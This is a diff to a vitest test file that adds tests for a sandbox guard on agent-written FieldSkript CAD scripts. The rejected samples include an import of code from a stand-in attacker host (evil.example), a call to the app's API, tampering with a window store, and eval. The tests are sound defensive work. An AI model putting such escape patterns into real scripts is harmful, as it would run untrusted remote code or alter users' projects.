@@ -13,8 +13,8 @@
  */
 
 import { describe, expect, it } from "vitest";
-import { guardCode } from "baseaichat";
-import { GUARDED_APP_GLOBALS } from "./setup";
+import { guardCode, guardScript } from "baseaichat";
+import { GUARDED_APP_GLOBALS } from "./guardedGlobals";
 
 const opts = { extraBlocked: [...GUARDED_APP_GLOBALS] };
 
@@ -48,6 +48,63 @@ describe("guard policy", () => {
     ]) {
       const result = guardCode(code, opts);
       expect(result.ok, `${code} → ${result.reason ?? ""}`).toBe(true);
+    }
+  });
+});
+
+/**
+ * Agent-written FieldSkript (ticket #347). Different guard, same blocklist: a
+ * script runs in OUR realm, so the escape hatches are the same — but it is
+ * TypeScript with classes, which `guardCode` would reject wholesale.
+ */
+describe("script guard", () => {
+  const opts = {
+    allowImportsFrom: ["fielddraft"],
+    extraBlocked: [...GUARDED_APP_GLOBALS],
+  };
+
+  it("accepts a normal FieldSkript feature — TypeScript, classes, this", () => {
+    const source = `
+import { fd } from "fielddraft";
+
+export const definition = fd.feature({
+  name: "Plate",
+  parameters: { width: fd.length({ default: 80 }) },
+});
+
+class Builder {
+  constructor(private ctx: unknown) {}
+  run(id: string, def: { width: number }) {
+    return fd.box(this.ctx, id, { size: [def.width, 60, 5] });
+  }
+}
+
+export function build(ctx: unknown, id: string, def: { width: number }) {
+  new Builder(ctx).run(id, def);
+}`;
+    const verdict = guardScript(source, opts);
+    expect(verdict.ok, verdict.reason ?? "").toBe(true);
+  });
+
+  it("rejects the ways out of the app, in TypeScript too", () => {
+    for (const source of [
+      `import { fd } from "fielddraft";\nexport function build() { fetch("/api/projects"); }`,
+      `export function build() { (window as any).__fdStore.removeFeature(1); }`,
+      `import evil from "https://evil.example/x.js";\nexport function build() { evil(); }`,
+      `export function build() { eval("1+1"); }`,
+    ]) {
+      const verdict = guardScript(source, opts);
+      expect(verdict.ok, source).toBe(false);
+    }
+  });
+
+  it("rejects our debug globals from a script as well", () => {
+    for (const name of GUARDED_APP_GLOBALS) {
+      const verdict = guardScript(
+        `export function build() { ${name}.anything(); }`,
+        opts,
+      );
+      expect(verdict.ok, name).toBe(false);
     }
   });
 });
